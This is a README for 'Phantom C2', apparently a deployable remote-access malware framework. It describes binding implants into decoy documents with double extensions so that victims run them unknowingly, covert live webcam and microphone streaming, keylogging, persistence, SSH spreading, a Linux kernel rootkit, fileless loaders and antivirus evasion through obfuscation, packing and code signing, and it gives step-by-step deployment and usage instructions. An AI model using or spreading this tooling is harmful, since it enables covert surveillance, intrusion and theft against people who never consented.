# Phantom C2

A self-hosted command-and-control framework: encrypted beacon, dashboard, cross
compiled implants, **file binder** with document icons, live camera and live
microphone streaming, keylogging, SOCKS pivoting and a Linux kernel rootkit.

Runs as a single Docker container and deploys cleanly on Coolify.

---

## What it does

| Area | Feature |
| --- | --- |
| Transport | AES-256-GCM sealed beacons over HTTPS, sleep + jitter, fallback C2 URL |
| Stealth | `-H windowsgui` (no console window), hidden child processes, `FreeConsole`, `-trimpath`, randomised user agent, start delay, optional `garble` / `upx` |
| Binder | Wraps **any** file (PDF, DOCX, XLSX, ZIP, JPG, EXE …) into one executable that opens the decoy with the default handler and runs the implant behind it, with the matching document icon |
| Surveillance | Live camera MJPEG stream, live microphone PCM stream to the browser, screenshots, one-shot webcam/mic capture, keylogger |
| Control | Shell, file browser, upload/download, process list, persistence (systemd / Run key / cron), rootkit modules, network scan, SSH spread, SOCKS5 pivot |
| Ops | Multi-target broadcast, per-target sleep/jitter, notes and tags, session export |

---

## Coolify deployment

1. Push this repository to Git and add a **new resource → Dockerfile** pointing at
   this repo.
2. Set the exposed port to **8000**. Do **not** map another port, Coolify’s proxy
   handles TLS.
3. Environment variables:

   | Variable | Required | Meaning |
   | --- | --- | --- |
   | `PHANTOM_PUBLIC_URL` | yes | Public `https://` URL of the app, e.g. `https://c2.example.com`. Baked into every payload and used to prefill the builder. |
   | `PHANTOM_AUTH` | yes | `user:password` for HTTP basic auth on the dashboard. |
   | `PHANTOM_PSK` | no | 32-byte hex pre-shared key. Generated and persisted to the volume when empty. |
   | `PHANTOM_SOCKS` | no | `true` to open the SOCKS5 pivot listener on `127.0.0.1:1080` inside the container. |
   | `PHANTOM_GARBLE` / `PHANTOM_UPX` | no | `true` to obfuscate / compress builds (build args `INSTALL_GARBLE=1`, `INSTALL_UPX=1`). |

4. Add a **persistent volume** mounted at `/data` (keys and build artifacts
   survive redeploys).
5. Health check path: `/healthz`.
6. Deploy. Open the dashboard, log in with `PHANTOM_AUTH`, and build.

The container compiles payloads on demand, so keep the `/data` volume and give
the container at least ~1.5 GB RAM.

### Plain Docker

```sh
docker build -t phantom .
docker run -d --name phantom -p 8000:8000 \
  -e PHANTOM_PUBLIC_URL=https://c2.example.com \
  -e PHANTOM_AUTH=admin:s3cret \
  -v phantom-data:/data phantom
```

### Compose

```sh
PHANTOM_PUBLIC_URL=https://c2.example.com PHANTOM_AUTH=admin:s3cret docker compose up -d
```

---

## Local (non Docker) run

```sh
./deploy.sh                 # dependencies + prime the build cache
cd server && python3 server.py
```

Then open `http://127.0.0.1:8000`. Run `python3 server/gen_certs.py` and set
`PHANTOM_TLS=true` if you need TLS on the C2 itself.

---

## Using the builder

1. Open **Builder**.
2. Drop the decoy file (invoice.pdf, contract.docx, photo.jpg …).
3. The callback URL is filled automatically from the request header
   (`X-Forwarded-Host` → public IP → LAN IP). Press **auto** to refresh.
4. Choose platform/arch, sleep, jitter, optional start delay.
5. **Bind & build** → download the artifact from *Artifacts*.

The produced file is `name.pdf.exe` (double extension keeps the PDF icon while
Windows still executes it). On launch the stub:

* writes the decoy to `%TEMP%` and opens it with the shell association,
* drops the implant beside it and starts it detached — no console flash,
* the implant then beacons to the configured URL.

Linux/macOS bindings are `.run` files (`chmod +x` them); they behave the same
using `xdg-open` / `open`.

Toggle **document icon** off to ship a plain `.exe`, or use **build raw implant**
for a bare binary, or **fileless .sh loader** for a memfd-only Linux payload.

---

## Operations notes

* **Live camera** and **live microphone** need `ffmpeg` on the target. Missing
  tools surface as a toast with the exact install hint. Devices are enumerated
  automatically (DirectShow / V4L2 / AVFoundation).
* Camera frames land in the **Media** tab; the audio stream is decoded by Web
  Audio at 16 kHz mono. Both stop with the matching `stop` / `mute` button.
* **SOCKS pivot**: run `socks` on a bot, then point tooling at `127.0.0.1:1080`
  (SSH tunnel or published port).
* **Rootkit** (Linux) needs `phantom_rootkit.ko` built with `make -C rootkit`
  and uploaded to the target.
* Keylogging on Linux needs read access to `/dev/input/*` (root).

## Detection notes

No payload is invisible to every AV engine. What is done here:

* GUI subsystem binary, no console flash, no visible window,
* strings stripped (`-s -w`, `-trimpath`), optional `garble` identifier
  obfuscation and `upx` packing,
* realistic browser user agent, encrypted body, HTTPS with jittered timing,
* decoy first: the user sees the document they expected.

For maximum evasion add a code-signing certificate afterwards:

```sh
osslsigncode sign -certs cert.pem -key key.pem -in in.exe -out out.exe
```

---

## Layout

```
implant/       Go beacon (cross platform) + stealth + live media
server/        FastAPI C2, builder, binder stub, dashboard, crypto
fileless/      memfd loader template
rootkit/       Linux LKM
Dockerfile     Coolify-ready image
```

## API quick reference

| Method | Path | Purpose |
| --- | --- | --- |
| `POST` | `/beacon` | encrypted beacon in/out |
| `POST` | `/api/media/push` | camera / microphone frames from implants |
| `GET` | `/api/config` | auto-detected callback URL and build limits |
| `POST` | `/api/bind` | multipart bind (file + options) |
| `POST` | `/api/build` | raw implant build |
| `GET/DELETE` | `/api/builds…` | artifact management |
| `POST` | `/api/session/{id}/command` | queue a command |
| `POST` | `/api/broadcast` | fan out a command |
| `GET` | `/healthz` | container health probe |

